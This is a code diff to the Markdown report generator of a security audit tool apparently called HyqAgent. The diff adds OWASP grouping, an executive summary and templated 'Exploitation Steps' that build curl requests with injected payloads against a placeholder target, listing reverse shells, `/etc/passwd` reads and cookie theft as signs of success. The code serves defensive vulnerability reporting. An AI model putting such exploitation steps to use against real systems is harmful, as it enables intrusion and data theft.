@@ -61,6 +61,7 @@ class ReportGenerator:
             coverage_audit: :class:`CoverageAuditResult` (deep mode only).
             phases_completed: List of completed phase names (deep mode only).
             validations: :class:`ValidationResult` list (deep mode only).
+            dynamic_verification_results: Dynamic verification output (deep mode only).
 
         """
         # Build a deep-audit context dict for format methods
@@ -113,7 +114,7 @@ class ReportGenerator:
     ) -> str:
         """Produce a rich JSON report."""
         # Build simplified annotated-path summaries
-        path_summaries: list[dict] = []
+        path_summaries: list[dict[str, Any]] = []
         for ap in getattr(result, "annotated_paths", []) or []:
             label = ap.label.value if hasattr(ap.label, "value") else str(ap.label)
             ss = ap.sanitizer_status
@@ -130,8 +131,6 @@ class ReportGenerator:
         from collections import Counter
 
         label_counts = Counter(ps["label"] for ps in path_summaries)
-
-        is_deep = deep_ctx is not None
 
         output: dict[str, Any] = {
             "scan_info": {
@@ -227,248 +226,508 @@ class ReportGenerator:
         language: str,
         deep_ctx: dict[str, Any] | None = None,
     ) -> str:
-        """Produce a human-readable Markdown report.
+        """Produce a Shannon-style human-readable Markdown report.
 
-        For deep mode, cross-references hypotheses, validations, and dynamic
-        verification results to produce action-oriented findings with
-        reproducible steps, PoC code, data flow traces, and CVSS scores.
+        Report structure:
+        1. Target Information
+        2. Executive Summary (prose + severity table + category breakdown)
+        3. Findings grouped by OWASP vulnerability category
+        4. Appendices (LLM data, coverage, blind spots — deep mode only)
         """
-        lines: list[str] = []
         findings = getattr(result, "findings", []) or []
         is_deep = deep_ctx is not None
         mode_label = "deep (LLM enhanced)" if is_deep else "quick (zero-LLM deterministic)"
 
-        # ── Header ───────────────────────────────────────────────────
-        lines.append("# HyqAgent 安全审计报告")
-        lines.append("")
-        lines.append(f"**版本**: {self._resolve_version()}  ")
-        lines.append(f"**模式**: {mode_label}  ")
-        lines.append(f"**语言**: {language or 'auto'}  ")
-        lines.append(f"**文件数**: {files_scanned}  ")
-        lines.append(f"**耗时**: {scan_duration_ms}ms  ")
-        lines.append(f"**时间**: {self._timestamp()}  ")
-        lines.append("")
+        # Enrich findings with deep audit cross-reference data (matches
+        # hypotheses + validations + dynamic verification to findings).
+        enriched: list[Any] = self._enrich_findings(list(findings), deep_ctx)
 
-        # ── Executive Summary ────────────────────────────────────────
-        lines.append("## 📊 摘要")
-        lines.append("")
+        # ── Title ──
+        lines: list[str] = [
+            "# HyqAgent 安全审计报告",
+            "",
+        ]
 
-        sev_counts: dict[str, int] = {}
-        for f in findings:
-            sev = getattr(f, "severity", "unknown")
-            sev_counts[sev] = sev_counts.get(sev, 0) + 1
+        # ── 1. Target Information ──
+        lines.extend(
+            self._build_target_info_table(language, files_scanned, scan_duration_ms, mode_label)
+        )
 
-        lines.append("| 指标 | 值 |")
-        lines.append("|------|----|")
-        lines.append(f"| 总发现数 | {len(findings)} |")
-        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
-        for sev in ("critical", "high", "medium", "low"):
-            c = sev_counts.get(sev, 0)
-            if c:
-                emoji = sev_emoji.get(sev, "")
-                lines.append(f"| {emoji} {sev} | {c} |")
+        # ── 2. Executive Summary ──
+        lines.extend(self._build_executive_summary(enriched, deep_ctx))
 
-        # Deep audit summary
-        if deep_ctx is not None:
-            ctx = deep_ctx
-            hyp_count = len(ctx.get("hypotheses", []))
-            val_count = len(ctx.get("validations", []))
-            conv = ctx.get("convergence")
-            cost = ctx.get("cost_summary")
-            dv_results = ctx.get("dynamic_verification_results", [])
-            confirmed_dv = sum(
-                1 for r in dv_results if r.get("verdict") == "confirmed"
-            )
-            lines.append(f"| LLM 假设 | {hyp_count} |")
-            lines.append(f"| LLM 验证 | {val_count} |")
-            if conv is not None:
-                lines.append(f"| 收敛轮次 | {getattr(conv, 'round', '?')} |")
-                lines.append(
-                    f"| 收敛状态 | {getattr(conv, 'recommendation', 'unknown')} |"
+        # ── 3. Findings by OWASP Category ──
+        if enriched:
+            grouped = self._group_findings_by_owasp(enriched)
+            for cat_name in self._category_display_order():
+                cat_findings = grouped.get(cat_name)
+                if not cat_findings:
+                    continue
+                lines.extend(
+                    self._build_category_section(cat_name, cat_findings, language)
                 )
-            if confirmed_dv:
-                lines.append(f"| 🧪 沙箱确认 | {confirmed_dv} |")
-            if cost is not None:
-                lines.append(f"| LLM 成本 | ${getattr(cost, 'total_cost', 0.0):.4f} |")
-
-        lines.append("")
-
-        # ── Findings (the main section) ──────────────────────────────
-        if findings:
-            # Enrich findings with deep audit cross-reference data
-            enriched = self._enrich_findings(findings, deep_ctx)
-
-            lines.append("## 🔍 漏洞发现")
             lines.append("")
-
-            for i, f in enumerate(enriched, 1):
-                title = getattr(f, "title", f"Finding {i}")
-                sev = getattr(f, "severity", "medium")
-                sev_up = sev.upper()
-                cwe_id = getattr(f, "cwe_id", "")
-                cvss_score = getattr(f, "cvss_score", 0.0)
-                endpoint = getattr(f, "endpoint", "")
-                http_method = getattr(f, "http_method", "")
-                source_loc = getattr(f, "source_location", "")
-                sink_loc = getattr(f, "sink_location", "")
-                desc = getattr(f, "description", "")
-                code = getattr(f, "code_snippet", "")
-                remediation = getattr(f, "remediation", "")
-                impact = getattr(f, "impact", "")
-                poc = getattr(f, "poc", "")
-                confidence = getattr(f, "confidence", "high")
-                validation_verdict = getattr(f, "validation_verdict", "")
-                validation_confidence = getattr(f, "validation_confidence", 0.0)
-
-                # Emoji per severity
-                sev_icon = {
-                    "critical": "🔴",
-                    "high": "🟠",
-                    "medium": "🟡",
-                    "low": "🟢",
-                }.get(sev, "⚪")
-
-                # Title line
-                endpoint_str = f" in {http_method} {endpoint}" if endpoint else ""
-                lines.append(f"### {sev_icon} F-{i:03d}: [{sev_up}] {title}{endpoint_str}")
-                lines.append("")
-
-                # ── Info table ──
-                lines.append("| 属性 | 值 |")
-                lines.append("|------|-----|")
-                if cwe_id:
-                    from hyqagent.report.templates import lookup_cwe_name
-
-                    cwe_name = lookup_cwe_name(cwe_id)
-                    cwe_label = f"{cwe_id}: {cwe_name}" if cwe_name else cwe_id
-                    lines.append(f"| **CWE** | {cwe_label} |")
-                if cvss_score > 0:
-                    cvss_vec = getattr(f, "cvss_vector", "")
-                    from hyqagent.report.templates import cvss_severity_label
-
-                    cvss_label = cvss_severity_label(cvss_score)
-                    lines.append(
-                        f"| **CVSS 3.1** | {cvss_score} ({cvss_label}) |"
-                    )
-                    if cvss_vec:
-                        lines.append(f"| **CVSS 向量** | `{cvss_vec}` |")
-
-                # Confidence with validation cross-reference
-                conf_parts = [f"确定性: {confidence}"]
-                if validation_verdict == "confirmed":
-                    conf_parts.append(
-                        f"LLM 验证: ✅ confirmed ({validation_confidence:.0%})"
-                    )
-                elif validation_verdict == "rejected":
-                    conf_parts.append(
-                        f"LLM 验证: ❌ rejected ({validation_confidence:.0%})"
-                    )
-                if poc:
-                    conf_parts.append("沙箱 PoC: ✅ verified")
-                lines.append(f"| **置信度** | {' · '.join(conf_parts)} |")
-
-                loc_parts = []
-                if source_loc:
-                    loc_parts.append(f"源: `{source_loc}`")
-                if sink_loc:
-                    loc_parts.append(f"汇: `{sink_loc}`")
-                if not loc_parts:
-                    fpath = getattr(f, "file_path", "")
-                    line_num = getattr(f, "line", 0)
-                    loc_parts.append(f"`{fpath}:{line_num}`")
-                lines.append(f"| **位置** | {' → '.join(loc_parts)} |")
-
-                # HTTP endpoint info
-                if endpoint:
-                    ep_label = f"`{http_method} {endpoint}`" if http_method else f"`{endpoint}`"
-                    lines.append(f"| **端点** | {ep_label} |")
-                    http_params = getattr(f, "http_params", "")
-                    if http_params:
-                        lines.append(f"| **参数** | `{http_params}` |")
-
-                lines.append("")
-
-                # ── Description ──
-                if desc:
-                    lines.append("#### 📖 描述")
-                    lines.append("")
-                    lines.append(desc)
-                    lines.append("")
-
-                # ── Code ──
-                if code:
-                    lang = language or ""
-                    lines.append(f"```{lang}")
-                    lines.append(code.strip())
-                    lines.append("```")
-                    lines.append("")
-
-                # ── Reproducible Steps ──
-                steps = getattr(f, "reproducible_steps", "")
-                if steps:
-                    lines.append("#### 🧪 复现步骤")
-                    lines.append("")
-                    lines.append(steps)
-                    lines.append("")
-                elif endpoint and cwe_id:
-                    # Auto-generate basic steps from template
-                    steps = self._build_repro_steps(f)
-                    if steps:
-                        lines.append("#### 🧪 复现步骤")
-                        lines.append("")
-                        lines.append(steps)
-                        lines.append("")
-
-                # ── PoC ──
-                if poc:
-                    lines.append("#### 💉 概念验证 (PoC)")
-                    lines.append("")
-                    lang = language or "bash"
-                    lines.append(f"```{lang}")
-                    lines.append(poc[:2000])
-                    lines.append("```")
-                    lines.append("")
-
-                # ── Impact ──
-                if impact:
-                    lines.append("#### 💥 影响")
-                    lines.append("")
-                    lines.append(impact)
-                    lines.append("")
-
-                # ── Remediation ──
-                if remediation:
-                    lines.append("#### 🛡 修复建议")
-                    lines.append("")
-                    lines.append(remediation)
-                    lines.append("")
-
-                lines.append("---")
-                lines.append("")
-
         else:
             lines.append("## ✅ 未发现问题")
             lines.append("")
             lines.append("该次扫描未发现任何确定性漏洞。")
             lines.append("")
 
-        # ── Coverage ─────────────────────────────────────────────────
-        coverage = getattr(result, "coverage", None)
-        if coverage:
-            lines.append("## 📈 覆盖率")
+        # ── 4. Appendices (deep mode) ──
+        lines.extend(self._build_appendices(result, deep_ctx))
+
+        return "\n".join(lines)
+
+    # ── Markdown building blocks ──────────────────────────────────────
+
+    @staticmethod
+    def _build_target_info_table(
+        language: str,
+        files_scanned: int,
+        scan_duration_ms: int,
+        mode_label: str,
+    ) -> list[str]:
+        """Build the Target Information section."""
+        from hyqagent.report.generator import ReportGenerator
+
+        lines: list[str] = [
+            "## 📋 目标信息 (Target Information)",
+            "",
+            "| 属性 | 值 |",
+            "|------|----|",
+            f"| **评估日期** | {ReportGenerator._timestamp()} |",
+            f"| **审计模式** | {mode_label} |",
+            f"| **目标语言** | {language or 'auto'} |",
+            f"| **扫描文件数** | {files_scanned} |",
+            f"| **扫描耗时** | {ReportGenerator._format_duration(scan_duration_ms)} |",
+            f"| **工具版本** | HyqAgent {ReportGenerator._resolve_version()} |",
+            "",
+        ]
+        return lines
+
+    @staticmethod
+    def _build_executive_summary(
+        findings: list[Any],
+        deep_ctx: dict[str, Any] | None,
+    ) -> list[str]:
+        """Build the Executive Summary section with prose and tables."""
+        from collections import Counter
+
+        from hyqagent.report.templates import lookup_owasp_category
+
+        lines: list[str] = [
+            "## 📊 执行摘要 (Executive Summary)",
+            "",
+        ]
+
+        total = len(findings)
+        if total == 0:
+            lines.append("本次审计**未发现任何安全漏洞**。目标代码的安全状况良好，所有检测项均通过。")
             lines.append("")
-            ep_cov = getattr(coverage, "endpoint_coverage_ratio", 0.0)
-            sk_cov = getattr(coverage, "sink_coverage_ratio", 0.0)
-            lines.append("| 维度 | 覆盖率 |")
-            lines.append("|------|--------|")
-            lines.append(f"| 端点覆盖 | {ep_cov * 100:.1f}% |")
-            lines.append(f"| Sink 覆盖 | {sk_cov * 100:.1f}% |")
+            return lines
+
+        sev_counts = Counter(getattr(f, "severity", "unknown") for f in findings)
+        critical = sev_counts.get("critical", 0)
+        high = sev_counts.get("high", 0)
+        medium = sev_counts.get("medium", 0)
+
+        # Prose summary — single paragraph for CISO-level reading
+        parts: list[str] = [f"本次安全审计共发现 **{total}** 个安全漏洞"]
+        if critical:
+            parts.append(f"其中 **{critical}** 个严重（Critical）漏洞需要**立即修复**")
+        if high:
+            parts.append(f"**{high}** 个高危（High）漏洞构成显著风险")
+        if medium:
+            parts.append(f"**{medium}** 个中危（Medium）漏洞")
+        lines.append("，".join(parts) + "。")
+        lines.append("")
+
+        if critical > 0:
+            lines.append(
+                "> 🔴 **立即行动**：存在严重级别漏洞，建议立即组建应急响应小组，"
+                "优先修复所有 Critical 级别发现，并在 24 小时内修复所有 High 级别发现。"
+            )
+        elif high > 0:
+            lines.append(
+                "> 🟠 **建议尽快修复**：存在高危漏洞，建议在本 Sprint 内按照"
+                "报告中提供的修复建议完成修复。"
+            )
+        lines.append("")
+
+        # Severity distribution table
+        lines.append("### 严重度分布")
+        lines.append("")
+        lines.append("| 严重度 | 数量 | 占比 |")
+        lines.append("|--------|------|------|")
+        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
+        for sev in ("critical", "high", "medium", "low"):
+            c = sev_counts.get(sev, 0)
+            if c > 0:
+                pct = f"{c / total * 100:.0f}%"
+                lines.append(f"| {sev_emoji.get(sev, '⚪')} {sev} | {c} | {pct} |")
+        lines.append("")
+
+        # Category breakdown table
+        lines.append("### 按漏洞类别汇总")
+        lines.append("")
+        lines.append("| 类别 | 数量 | 最高严重度 |")
+        lines.append("|------|------|-----------|")
+
+        cat_aggs: dict[tuple[str, str], dict[str, Any]] = {}
+        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "unknown": 0}
+        for f in findings:
+            category = getattr(f, "category", "")
+            primary = category.split(",")[0].strip() if category else ""
+            _, prefix, display_name = lookup_owasp_category(primary)
+            key = (prefix, display_name)
+            if key not in cat_aggs:
+                cat_aggs[key] = {"count": 0, "max_sev": "low", "max_rank": 0}
+            cat_aggs[key]["count"] += 1
+            sev = getattr(f, "severity", "low")
+            rank = sev_rank.get(sev, 0)
+            if rank > cat_aggs[key]["max_rank"]:
+                cat_aggs[key]["max_sev"] = sev
+                cat_aggs[key]["max_rank"] = rank
+
+        for (_prefix, display_name), ag in sorted(
+            cat_aggs.items(), key=lambda x: x[1]["count"], reverse=True
+        ):
+            icon = sev_emoji.get(ag["max_sev"], "⚪")
+            lines.append(f"| {icon} {display_name} | {ag['count']} | {ag['max_sev']} |")
+        lines.append("")
+
+        # Deep audit summary line
+        if deep_ctx is not None:
+            ctx = deep_ctx
+            cost = ctx.get("cost_summary")
+            conv = ctx.get("convergence")
+            dv_results = ctx.get("dynamic_verification_results", [])
+            confirmed_dv = sum(1 for r in dv_results if r.get("verdict") == "confirmed")
+            hyp_count = len(ctx.get("hypotheses", []))
+
+            lines.append(
+                f"*LLM 增强审计：{hyp_count} 个假设 · "
+                f"{getattr(conv, 'round', '?')} 轮收敛 · "
+            )
+            cost_str = f"${getattr(cost, 'total_cost', 0.0):.4f}" if cost else "N/A"
+            if confirmed_dv:
+                lines[-1] += f"{confirmed_dv} 沙箱确认 · "
+            lines[-1] += f"成本 {cost_str}*"
             lines.append("")
 
-        # ── Deep audit sections (after findings) ─────────────────────
-        if is_deep and deep_ctx is not None:
+        return lines
 
-            # LLM Hypotheses table
+    @staticmethod
+    def _group_findings_by_owasp(
+        findings: list[Any],
+    ) -> dict[str, list[Any]]:
+        """Group findings by their OWASP category section name.
+
+        Each finding gets a synthetic ``_display_id`` attribute like
+        ``"INJ-001"`` set on it for use in the category section.
+        """
+        from hyqagent.report.templates import lookup_owasp_category
+
+        # Assign display IDs: one counter per category prefix
+        counters: dict[str, int] = {}
+        grouped: dict[str, list[Any]] = {}
+
+        for f in findings:
+            category = getattr(f, "category", "")
+            primary = category.split(",")[0].strip() if category else ""
+            section_name, prefix, _display_name = lookup_owasp_category(primary)
+            if prefix not in counters:
+                counters[prefix] = 0
+            counters[prefix] += 1
+            f._display_id = f"{prefix}-{counters[prefix]:03d}"
+            grouped.setdefault(section_name, []).append(f)
+
+        return grouped
+
+    @staticmethod
+    def _category_display_order() -> list[str]:
+        """Canonical ordering of OWASP category section names."""
+        from hyqagent.report.templates import get_category_order
+
+        return get_category_order()
+
+    def _build_category_section(
+        self,
+        cat_name: str,
+        cat_findings: list[Any],
+        language: str,
+    ) -> list[str]:
+        """Build a single OWASP-category H1 section with all its findings."""
+        lines: list[str] = []
+        lines.append("---")
+        lines.append("")
+        lines.append(f"# {cat_name}")
+        lines.append("")
+
+        for f in cat_findings:
+            lines.extend(self._build_finding_shannon_style(f, language))
+            lines.append("---")
+            lines.append("")
+
+        return lines
+
+    def _build_finding_shannon_style(
+        self,
+        f: Any,
+        language: str,
+    ) -> list[str]:
+        """Render a single finding in Shannon-style format.
+
+        Structure: Summary → Prerequisites → Exploitation Steps →
+        Code Reference → Proof of Impact → Remediation.
+        """
+        from hyqagent.report.templates import (
+            cvss_severity_label,
+            lookup_cwe_name,
+            lookup_owasp_category,
+            lookup_prerequisites,
+            lookup_proof_of_impact,
+        )
+
+        lines: list[str] = []
+
+        # ── Header line ──
+        disp_id = getattr(f, "_display_id", getattr(f, "id", "???"))
+        title = getattr(f, "title", "Untitled")
+        sev = getattr(f, "severity", "medium")
+        cwe_id = getattr(f, "cwe_id", "")
+        cvss_score = getattr(f, "cvss_score", 0.0)
+
+        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(sev, "⚪")
+        cwe_label = ""
+        if cwe_id:
+            cwe_name = lookup_cwe_name(cwe_id)
+            cwe_label = f"{cwe_id}: {cwe_name}" if cwe_name else cwe_id
+        cvss_label = ""
+        if cvss_score > 0:
+            cvss_label = f"CVSS {cvss_score} ({cvss_severity_label(cvss_score)})"
+
+        header_parts = [f"### {sev_emoji} {disp_id}: {title}"]
+        header_parts.append(f"[{sev.upper()}]")
+        if cwe_label:
+            header_parts.append(cwe_label)
+        if cvss_label:
+            header_parts.append(cvss_label)
+        lines.append(" ".join(header_parts))
+        lines.append("")
+
+        # ── Summary ──
+        lines.append("#### Summary")
+        lines.append("")
+
+        src_loc = getattr(f, "source_location", "")
+        sink_loc = getattr(f, "sink_location", "")
+        file_path = getattr(f, "file_path", "")
+        line_num = getattr(f, "line", 0)
+        desc = getattr(f, "description", "")
+        impact_text = getattr(f, "impact", "")
+        category = getattr(f, "category", "")
+        primary_vuln = category.split(",")[0].strip() if category else ""
+        _, __, display_type = lookup_owasp_category(primary_vuln)
+
+        # Vulnerable location
+        if src_loc and sink_loc:
+            lines.append(f"- **Vulnerable location:** `{src_loc}` → `{sink_loc}`")
+        elif file_path:
+            lines.append(f"- **Vulnerable location:** `{file_path}:{line_num}`")
+        else:
+            lines.append(f"- **Vulnerable location:** `{file_path or 'unknown'}:{line_num}`")
+
+        # Overview
+        if desc:
+            lines.append(f"- **Overview:** {desc}")
+        else:
+            lines.append(
+                f"- **Overview:** {display_type} vulnerability "
+                f"detected via taint analysis"
+            )
+        # Impact (concise)
+        if impact_text:
+            first_line = impact_text.split("\n")[0].strip()
+            lines.append(f"- **Impact:** {first_line}")
+        lines.append("")
+
+        # ── Prerequisites ──
+        lines.append("**Prerequisites:**")
+        lines.append("")
+        prereqs = lookup_prerequisites(primary_vuln) if primary_vuln else ""
+        if prereqs:
+            lines.append(prereqs)
+        else:
+            lines.append("- 攻击者可以访问受影响的功能端点")
+        lines.append("")
+
+        # ── Exploitation Steps ──
+        lines.extend(self._build_exploitation_steps(f))
+        lines.append("")
+
+        # ── Code Reference ──
+        lines.append("**Code Reference:**")
+        lines.append("")
+        code = getattr(f, "code_snippet", "")
+        if code:
+            lang = language or ""
+            lines.append(f"```{lang}")
+            lines.append(code.strip())
+            lines.append("```")
+        elif file_path:
+            lines.append(f"See `{file_path}:{line_num}`")
+        lines.append("")
+
+        # ── Proof of Impact ──
+        lines.append("**Proof of Impact:**")
+        lines.append("")
+        poi = lookup_proof_of_impact(primary_vuln) if primary_vuln else ""
+        if poi:
+            lines.append(poi)
+        else:
+            lines.append(
+                "成功利用此漏洞后，攻击者可以绕过安全控制机制，对应用系统的"
+                "机密性、完整性或可用性造成损害。"
+            )
+        lines.append("")
+
+        # ── Remediation ──
+        remediation = getattr(f, "remediation", "")
+        if remediation:
+            lines.append("**Remediation:**")
+            lines.append("")
+            lines.append(remediation)
+            lines.append("")
+
+        # ── LLM validation cross-reference (if available) ──
+        val_verdict = getattr(f, "validation_verdict", "")
+        val_conf = getattr(f, "validation_confidence", 0.0)
+        if val_verdict == "confirmed":
+            lines.append(f"*🤖 LLM 验证: ✅ confirmed ({val_conf:.0%})*")
+        elif val_verdict == "rejected":
+            lines.append(f"*🤖 LLM 验证: ❌ rejected ({val_conf:.0%})*")
+        if val_verdict:
+            lines.append("")
+
+        return lines
+
+    @staticmethod
+    def _build_exploitation_steps(finding: Any) -> list[str]:
+        """Build exploitation steps for a finding.
+
+        If HTTP endpoint data is available, generates concrete curl/httpie
+        commands.  Otherwise, constructs steps from the code-path description
+        and vulnerability type — always produces output.
+        """
+        endpoint = getattr(finding, "endpoint", "")
+        http_method = getattr(finding, "http_method", "GET")
+        http_params = getattr(finding, "http_params", "")
+        cwe_id = getattr(finding, "cwe_id", "")
+        category = getattr(finding, "category", "")
+        primary_vuln = category.split(",")[0].strip() if category else ""
+
+        lines: list[str] = ["**Exploitation Steps:**", ""]
+
+        # Step 1 — craft payload
+        payload, payload_desc = _payload_for_vuln(cwe_id, primary_vuln)
+        lines.append(f"1. {payload_desc}")
+
+        # Step 2 — send request (with curl if endpoint available)
+        if endpoint:
+            param_str = ""
+            if payload and http_params:
+                params = [p.strip() for p in http_params.split(",") if p.strip()]
+                if params:
+                    param_str = "?" + "&".join(f"{p}={payload}" for p in params)
+            elif payload:
+                param_str = f"?param={payload}"
+
+            lines.append("")
+            lines.append(
+                f"2. Send the request to `{http_method} {endpoint}{param_str}`"
+            )
+            lines.append("")
+            curl_cmd = f"curl -X {http_method} 'http://<target>{endpoint}{param_str}'"
+            if http_method in ("POST", "PUT", "PATCH") and param_str:
+                curl_cmd = (
+                    f"curl -X {http_method} 'http://<target>{endpoint}' \\\n"
+                    f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
+                    f"  -d '{param_str.lstrip('?')}'"
+                )
+            lines.append("```bash")
+            lines.append(curl_cmd)
+            lines.append("```")
+        else:
+            src_loc = getattr(finding, "source_location", "")
+            sink_loc = getattr(finding, "sink_location", "")
+            file_path = getattr(finding, "file_path", "")
+            line_num = getattr(finding, "line", 0)
+            code = getattr(finding, "code_snippet", "")
+
+            lines.append("")
+            lines.append(
+                "2. The tainted data flows from the source to the sink "
+                "without proper sanitization:"
+            )
+            lines.append("")
+            loc = src_loc or sink_loc or f"{file_path}:{line_num}" if file_path else "N/A"
+            lines.append(f"   - **Location:** `{loc}`")
+            if code:
+                lines.append(f"   - **Vulnerable code:** `{code.strip()[:120]}`")
+            if payload:
+                lines.append(f"   - **Test payload:** `{payload}`")
+        lines.append("")
+
+        # Step 3 — verify
+        lines.append("3. Observe the response — confirm:")
+        if "CWE-89" in (cwe_id or ""):
+            lines.append("   - Database error messages or unexpected data in the response")
+            lines.append("   - Ability to extract data via UNION-based or boolean-based techniques")
+        elif "CWE-79" in (cwe_id or ""):
+            lines.append("   - JavaScript execution in the browser (alert popup)")
+            lines.append("   - Session cookie accessible via `document.cookie`")
+        elif "CWE-918" in (cwe_id or ""):
+            lines.append("   - Internal service response in the returned content")
+            lines.append("   - Cloud metadata (e.g., `ami-id`, `security-groups`) visible")
+        elif "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
+            lines.append("   - Command output reflected in the response")
+            lines.append("   - Reverse shell connection received on the attacker's listener")
+        elif "CWE-22" in (cwe_id or ""):
+            lines.append("   - File contents (e.g., `/etc/passwd`) in the response")
+            lines.append("   - Ability to read files outside the intended directory")
+        elif "CWE-502" in (cwe_id or ""):
+            lines.append("   - Application crash or unexpected behavior after payload delivery")
+            lines.append("   - Reverse shell or command execution confirmed")
+        else:
+            lines.append("   - Unexpected behavior or error messages")
+            lines.append("   - Sensitive data leakage or privilege escalation")
+
+        return lines
+
+    # ── Appendices builder ────────────────────────────────────────────
+
+    def _build_appendices(
+        self,
+        result: ScanResult,
+        deep_ctx: dict[str, Any] | None,
+    ) -> list[str]:
+        """Build the appendices section (LLM data, coverage, blind spots)."""
+        lines: list[str] = []
+
+        lines.append("---")
+        lines.append("")
+        lines.append("# 附录 (Appendices)")
+        lines.append("")
+
+        is_deep = deep_ctx is not None
+
+        # ── Deep audit appendices ──
+        if is_deep:
+            assert deep_ctx is not None  # mypy type narrowing
+            ctx: dict[str, Any] = deep_ctx
+
+            # LLM Hypotheses
             hypotheses = ctx.get("hypotheses", [])
             if hypotheses:
                 lines.append("## 🤖 LLM 假设详情")
@@ -488,7 +747,7 @@ class ReportGenerator:
                     )
                 lines.append("")
 
-            # Dynamic verification results
+            # Dynamic verification (if available)
             dv_results = ctx.get("dynamic_verification_results", [])
             if dv_results:
                 lines.append("## 🧪 动态验证 (沙箱)")
@@ -508,6 +767,18 @@ class ReportGenerator:
                     lines.append(
                         f"| {j} | {vt} | {sev_dv} | {v_icon} {verdict} | {uconf:.0%} |"
                     )
+
+                # PoC snippets from dynamic verification
+                for dv in dv_results:
+                    poc_code = dv.get("poc_code", "")
+                    if poc_code:
+                        lines.append("")
+                        lines.append("### PoC 示例")
+                        lines.append("")
+                        lang = dv.get("language", "bash")
+                        lines.append(f"```{lang}")
+                        lines.append(poc_code[:2000])
+                        lines.append("```")
                 lines.append("")
 
             # Convergence
@@ -538,9 +809,10 @@ class ReportGenerator:
                 lines.append(
                     f"| Completion tokens | {getattr(cost, 'total_output_tokens', 0):,} |"
                 )
+                lines.append(f"| 扫描耗时 | {ReportGenerator._format_duration(0)} |")
                 lines.append("")
 
-            # Phases completed
+            # Phases
             phases = ctx.get("phases_completed", [])
             if phases:
                 lines.append("## 📋 执行阶段")
@@ -549,7 +821,20 @@ class ReportGenerator:
                     lines.append(f"- ✅ {p}")
                 lines.append("")
 
-        # ── Blind spots (both modes) ─────────────────────────────────
+        # ── Coverage (both modes) ──
+        coverage = getattr(result, "coverage", None)
+        if coverage:
+            lines.append("## 📈 覆盖率")
+            lines.append("")
+            ep_cov = getattr(coverage, "endpoint_coverage_ratio", 0.0)
+            sk_cov = getattr(coverage, "sink_coverage_ratio", 0.0)
+            lines.append("| 维度 | 覆盖率 |")
+            lines.append("|------|--------|")
+            lines.append(f"| 端点覆盖 | {ep_cov * 100:.1f}% |")
+            lines.append(f"| Sink 覆盖 | {sk_cov * 100:.1f}% |")
+            lines.append("")
+
+        # ── Blind spots (both modes) ──
         blind_spots = self._blind_spot_list(result)
         if blind_spots:
             lines.append("## ⚠️ 盲区清单")
@@ -567,7 +852,7 @@ class ReportGenerator:
                     lines.append(f"  → {rec}")
             lines.append("")
 
-        return "\n".join(lines)
+        return lines
 
     # ── SARIF ──────────────────────────────────────────────────────────
 
@@ -582,8 +867,8 @@ class ReportGenerator:
         findings = getattr(result, "findings", []) or []
 
         # Build SARIF results
-        sarif_results: list[dict] = []
-        rules: dict[str, dict] = {}
+        sarif_results: list[dict[str, Any]] = []
+        rules: dict[str, dict[str, Any]] = {}
         rule_index: dict[str, int] = {}
 
         for i, f in enumerate(findings):
@@ -619,10 +904,10 @@ class ReportGenerator:
                 },
             }
             if region:
-                location["physicalLocation"]["region"] = region  # type: ignore[index]
+                location["physicalLocation"]["region"] = region
 
             if code:
-                location["physicalLocation"]["contextRegion"] = {  # type: ignore[index]
+                location["physicalLocation"]["contextRegion"] = {
                     "snippet": {"text": code},
                 }
 
@@ -632,7 +917,10 @@ class ReportGenerator:
                     "ruleIndex": rule_index[rid],
                     "level": _sarif_level(sev),
                     "message": {
-                        "text": f"{getattr(f, 'title', rid)}: {getattr(f, 'description', '')[:200]}",
+                        "text": (
+                            f"{getattr(f, 'title', rid)}: "
+                            f"{getattr(f, 'description', '')[:200]}"
+                        ),
                     },
                     "locations": [location],
                 }
@@ -699,7 +987,7 @@ class ReportGenerator:
         return d
 
     @staticmethod
-    def _coverage_dict(result: ScanResult) -> dict | None:
+    def _coverage_dict(result: ScanResult) -> dict[str, Any] | None:
         """Extract coverage data from result, if present."""
         coverage = getattr(result, "coverage", None)
         if coverage is None:
@@ -818,19 +1106,19 @@ class ReportGenerator:
                     f.validation_verdict = getattr(val, "verdict", "")
                     f.validation_confidence = getattr(val, "confidence", 0.0)
 
-                # Fill in empty enriched fields from hypothesis
+                # Fill in empty enriched fields from hypothesis.
+                # source_location/sink_location are now populated at Finding
+                # creation time (in _annotated_to_findings), so these
+                # normally won't fire — kept as safety fallbacks.
                 if not getattr(f, "cwe_id", ""):
                     f.cwe_id = getattr(matched_hyp, "cwe_id", "")
                 if not getattr(f, "source_location", ""):
                     f.source_location = getattr(matched_hyp, "source_location", "")
                 if not getattr(f, "sink_location", ""):
                     f.sink_location = getattr(matched_hyp, "sink_location", "")
-                if not getattr(f, "endpoint", ""):
-                    f.endpoint = getattr(matched_hyp, "endpoint", "")
-                if not getattr(f, "http_method", ""):
-                    f.http_method = getattr(matched_hyp, "http_method", "")
-                if not getattr(f, "http_params", ""):
-                    f.http_params = getattr(matched_hyp, "http_params", "")
+                # Note: endpoint/http_method/http_params are NOT populated from
+                # Hypothesis (the dataclass doesn't carry those fields).
+                # They must be filled from framework extractor data — TODO.
 
             # Attach PoC from dynamic verification
             vuln_type = vuln_type or getattr(f, "category", "")
@@ -840,14 +1128,6 @@ class ReportGenerator:
                     poc_code = dv.get("poc_code", "")
                     if poc_code:
                         f.poc = poc_code
-
-            # Build reproducible steps from endpoint + cwe
-            endpoint = getattr(f, "endpoint", "")
-            cwe_id = getattr(f, "cwe_id", "")
-            if endpoint and cwe_id and not getattr(f, "reproducible_steps", ""):
-                steps = ReportGenerator._build_repro_steps(f)
-                if steps:
-                    f.reproducible_steps = steps
 
             # Fill impact from template if empty
             if not getattr(f, "impact", ""):
@@ -860,78 +1140,16 @@ class ReportGenerator:
         return findings
 
     @staticmethod
-    def _build_repro_steps(finding: Any) -> str:
-        """Build reproducible steps from finding metadata.
-
-        Uses endpoint, http_method, http_params, and cwe_id to construct
-        a step-by-step reproduction guide.  Returns empty string if
-        insufficient data is available.
-        """
-        endpoint = getattr(finding, "endpoint", "")
-        http_method = getattr(finding, "http_method", "GET")
-        http_params = getattr(finding, "http_params", "")
-        cwe_id = getattr(finding, "cwe_id", "")
-
